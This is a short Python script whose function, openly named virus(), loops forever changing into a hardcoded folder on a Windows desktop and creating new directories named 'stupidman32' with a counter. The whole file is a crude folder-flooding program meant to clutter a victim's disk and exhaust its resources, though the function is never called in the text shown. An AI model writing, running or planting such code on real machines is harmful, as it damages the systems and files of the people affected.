import os
def virus():
	i = 0
	print(os.getcwd())
	while True:
		os.chdir(r"C:\Users\Администратор\Desktop\lop")
		os.mkdir("stupidman32" + str(i))
		i+=1